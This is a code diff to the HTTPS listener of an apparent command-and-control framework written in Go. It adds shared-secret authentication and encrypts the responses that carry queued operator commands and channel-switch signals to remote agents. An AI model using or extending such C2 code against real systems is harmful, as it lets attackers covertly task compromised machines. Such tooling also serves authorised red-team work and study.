@@ -13,6 +13,7 @@ import (
 
 	"c2framework/internals/config"
 	"c2framework/internals/control"
+	"c2framework/internals/crypto"
 )
 
 // HTTPSServer implements the Server interface for HTTPS
@@ -20,7 +21,8 @@ type HTTPSServer struct {
 	addr    string
 	server  *http.Server
 	tlsCert string
-	tlsKey  string
+	tlsKey       string
+	sharedSecret string
 }
 
 // HTTPSResponse represents the JSON response for HTTPS
@@ -37,7 +39,8 @@ func NewHTTPSServer(cfg *config.ServerConfig) *HTTPSServer {
 	return &HTTPSServer{
 		addr:    fmt.Sprintf("%s:%s", cfg.ListeningInterface, cfg.ListeningPort),
 		tlsCert: cfg.TlsCert,
-		tlsKey:  cfg.TlsKey,
+		tlsKey:       cfg.TlsKey,
+		sharedSecret: cfg.SharedSecret,
 	}
 }
 
@@ -47,7 +50,7 @@ func (s *HTTPSServer) Start() error {
 	r := chi.NewRouter()
 
 	// Apply authentication middleware to agent routes
-	r.With(AuthMiddleware).Get("/", RootHandler)
+	r.With(AuthMiddleware(s.sharedSecret)).Get("/", RootHandler(s.sharedSecret))
 
 	// Create the HTTP server
 	s.server = &http.Server{
@@ -73,44 +76,54 @@ func (s *HTTPSServer) Stop() error {
 	return s.server.Shutdown(ctx)
 }
 
-// RootHandler handles requests to the root endpoint
-func RootHandler(w http.ResponseWriter, r *http.Request) {
+// RootHandler returns a handler that encrypts responses
+func RootHandler(secret string) http.HandlerFunc {
+	return func(w http.ResponseWriter, r *http.Request) {
+		log.Printf("Endpoint %s has been hit by agent\n", r.URL.Path)
 
-	log.Printf("Endpoint %s has been hit by agent\n", r.URL.Path)
+		var response HTTPSResponse
 
-	var response HTTPSResponse
+		// FIRST, check if there are pending commands
+		cmd, exists := control.AgentCommands.GetCommand()
+		if exists {
+			log.Printf("Sending command to agent: %s\n", cmd.Command)
+			response.Job = true
+			response.Command = cmd.Command
+			response.Arguments = cmd.Arguments
+			response.JobID = fmt.Sprintf("job_%06d", rand.Intn(1000000))
+			log.Printf("Job ID: %s\n", response.JobID)
+		} else {
+			log.Printf("No commands in queue")
+		}
 
-	// FIRST, check if there are pending commands
-	cmd, exists := control.AgentCommands.GetCommand()
-	if exists {
-		log.Printf("Sending command to agent: %s\n", cmd.Command)
-		response.Job = true
-		response.Command = cmd.Command
-		response.Arguments = cmd.Arguments
-		response.JobID = fmt.Sprintf("job_%06d", rand.Intn(1000000))
-		log.Printf("Job ID: %s\n", response.JobID)
-	} else {
-		log.Printf("No commands in queue")
+		// THEN, check if we should transition
+		shouldChange := control.Manager.CheckAndReset()
+
+		if shouldChange {
+			response.Change = true
+			log.Printf("HTTPS: Sending transition signal (change=true)")
+		} else {
+			log.Printf("HTTPS: Normal response (change=false)")
+		}
+
+		// Marshal response to JSON
+		responseJSON, err := json.Marshal(response)
+		if err != nil {
+			log.Printf("Error marshaling response: %v\n", err)
+			http.Error(w, "Internal Server Error", http.StatusInternalServerError)
+			return
+		}
+
+		// Encrypt the response
+		encryptedResponse, err := crypto.Encrypt(responseJSON, secret)
+		if err != nil {
+			log.Printf("Error encrypting response: %v\n", err)
+			http.Error(w, "Internal Server Error", http.StatusInternalServerError)
+			return
+		}
+
+		// Set content type to octet-stream for encrypted data
+		w.Header().Set("Content-Type", "application/octet-stream")
+		w.Write([]byte(encryptedResponse))
 	}
-
-	// THEN, check if we should transition
-	shouldChange := control.Manager.CheckAndReset()
-
-	if shouldChange {
-		response.Change = true
-		log.Printf("HTTPS: Sending transition signal (change=true)")
-	} else {
-		log.Printf("HTTPS: Normal response (change=false)")
-	}
-
-	// Set content type to JSON
-	w.Header().Set("Content-Type", "application/json")
-
-	// Encode and send the response
-	if err := json.NewEncoder(w).Encode(response); err != nil {
-		log.Printf("Error encoding response: %v\n", err)
-		http.Error(w, "Internal Server Error", http.StatusInternalServerError)
-		return
-	}
-
 }
